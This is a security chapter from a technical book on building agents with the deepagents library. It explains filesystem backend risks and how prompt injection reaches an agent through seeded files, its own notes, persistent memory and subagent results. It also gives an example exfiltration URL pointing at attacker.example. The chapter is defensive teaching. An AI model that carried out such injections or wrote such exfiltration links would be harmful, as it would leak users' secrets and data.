# Chapter 28 — Security

A deep agent reads files, writes files, spawns other agents, and follows instructions from
whatever it reads. That is a broader attack surface than anything else in these five books,
and one option in Chapter 8 hands a language model write access to your disk.

## The sharpest edge first

```python
FilesystemBackend(root_dir=".", virtual_mode=True)
```

This looks cautious and is not. Measured in Chapter 8:

```
virtual_mode=True  ->  file on real disk? True
```

**`virtual_mode` constrains paths, not access.** It blocks `..` and escapes from `root_dir`;
it does not stop the agent overwriting everything inside `root_dir`. The library's own
docstring says so: *"it does not provide sandboxing or process isolation."*

If files should never touch your disk, use `StateBackend` — the default. If the agent
genuinely must edit real files:

- Point `root_dir` at a **scratch directory**, never a source tree or a home directory.
- Require **approval on `write_file`, `edit_file` and `delete`** (Chapter 13).
- Treat it as you would `exec`, because in effect it is.

## Prompt injection reaches further here

Injection attacks a *decision*, and no prompt reliably prevents it. What is specific to deep
agents is how many things the model reads:

**Seeded files.** Logs, tickets, uploaded documents. If a user can influence a log line, they
can put instructions in it — and it arrives with the authority of your own workspace.

**Files the agent wrote earlier.** An agent that summarised a hostile document into
`/notes.md` and re-reads it later has laundered the injection into its own note.

**Long-term memory.** Worse: an injection written to `StoreBackend` persists **across
sessions**, and every future run reads it as established fact. This is the most damaging
version, because it is invisible and compounding.

**Subagent results.** A subagent that read hostile content returns a sentence the parent
trusts.

The defence is not prompting. It is that **nothing the agent can do should be dangerous**:

- Narrow tools (Chapter 14).
- Tenant scope closed over from context, never a model argument.
- Approval or refusal on irreversible actions.
- A backend that cannot reach anything precious.

## Memory needs review

Chapter 11's rule, restated as a security control: **prefer writing long-term memory from
deterministic code.**

An agent that writes its own conclusions to a durable namespace will read them back as fact.
If one of those conclusions came from an injected instruction, you have persistent
compromise that survives your deployment.

If the agent must write memory:

- Constrain it to a path your code reviews before promoting.
- Timestamp it, so staleness is visible.
- Be able to inspect and delete it per user.

## Tenant isolation

Two boundaries, and both must hold.

**The store namespace** (Chapter 11):

```python
StoreBackend(namespace=lambda rt: ("memories", rt.context.user_id))
```

From **context**, never from state or a tool argument. State can be influenced by model output
and user input; a namespace built from it is a traversal waiting to happen. Put the tenant in
the tuple, not the filename.

**The backend routing** (Chapter 8). `CompositeBackend` routes are a structural boundary — if
only `/repo/` maps to disk, nothing written elsewhere can escape, regardless of what any rule
forgets. Prefer structure over checks.

Test it: run as tenant A, assert nothing of tenant B's is reachable.

## Subagents inherit less than you think

Useful for security: a subagent gets the tools **you** give it. Keeping a dangerous tool out
of the parent and giving it only to a narrowly-briefed subagent limits when it can be reached.

But note skills are **not** inherited (Chapter 10), so a subagent will not have the safety
instructions in your skills unless you pass them. A subagent briefed to "clean up the
workspace" without the parent's constraints is a real hazard.

## What leaves your infrastructure

Everything the model sees goes to the provider: the question, **every file the agent reads**,
tool results, and the system prompt. For a deep agent that is potentially your whole workspace.

Two consequences. Seeding a document means sending it. And an agent with `FilesystemBackend`
over a source tree can send your source to a third party by reading it — which is the quiet
version of the disk-access risk.

Tracing (Chapter 22) sends prompts to another service too.

## Output is untrusted

The report is model output. Do not render it as HTML unescaped, execute it, or follow URLs it
produces. A model persuaded to write `https://attacker.example/?d=<secret>` into a report your
dashboard auto-links is an exfiltration path.

## A checklist

- [ ] Backend is `StateBackend` unless real files are genuinely required.
- [ ] If `FilesystemBackend`: scratch `root_dir`, approval on writes, never a source tree.
- [ ] **You have not mistaken `virtual_mode=True` for a sandbox.**
- [ ] Tenant scope from **context**, in the store **namespace tuple**.
- [ ] `CompositeBackend` routing used as a structural boundary.
- [ ] Long-term memory written by code, or reviewed before promotion.
- [ ] Irreversible actions blocked or human-approved.
- [ ] Subagents given the skills and constraints they need — nothing is inherited.
- [ ] `recursion_limit` and a call limit set (a runaway is a denial-of-wallet attack).
- [ ] Seeded and retrieved content treated as untrusted instructions.
- [ ] You know what leaves your infrastructure, including everything the agent reads.
- [ ] Model output escaped before rendering, never executed.

## Try it

Confirm the default keeps files off your disk, and that `virtual_mode` does not:

```bash
uv run python -c "
import tempfile, pathlib
from deepagents import create_deep_agent
from deepagents.backends import FilesystemBackend
from examples.scout.fakes import ScriptedModel

def probe(backend=None):
    m = ScriptedModel(script=[{'text':'x','tool_calls':[{'name':'write_file','args':{'file_path':'/new.txt','content':'AGENT WROTE THIS'}}]}, 'done'])
    kw = {'backend': backend} if backend else {}
    return create_deep_agent(model=m, **kw).invoke({'messages':[{'role':'user','content':'go'}]})

print('StateBackend (default) -> in state:', sorted(probe()['files']))
d = tempfile.mkdtemp()
probe(FilesystemBackend(root_dir=d, virtual_mode=True))
print('FilesystemBackend(virtual_mode=True) -> on disk:', (pathlib.Path(d)/'new.txt').exists())
"
```

## Takeaways

- **`virtual_mode=True` is not a sandbox.** It constrains paths and still writes to disk. Use
  `StateBackend` for files that must not touch disk.
- With `FilesystemBackend`: scratch directory, approval on writes, treat it as `exec`.
- Injection reaches further here — seeded files, the agent's own notes, **long-term memory**
  (which persists across sessions), and subagent results.
- Defend structurally: narrow tools, scope from context, approval on the irreversible, and a
  backend that cannot reach anything precious.
- **Prefer writing long-term memory from deterministic code.** Agent-written memory is read
  back as fact, including anything injected into it.
- Tenant isolation is the **store namespace** (from context, in the tuple) and **backend
  routing** (structural). Test it.
- Subagents inherit tools you give them and **do not inherit skills** — including your safety
  instructions.
- Everything the agent reads goes to the provider. An agent with disk access can exfiltrate by
  reading.
- Model output is untrusted: escape it, never execute it, and be careful with URLs it writes.

---

Previous: [Chapter 27 — Cost and context](27-cost.md) ·
Next: [Chapter 29 — Deployment](29-deployment.md)
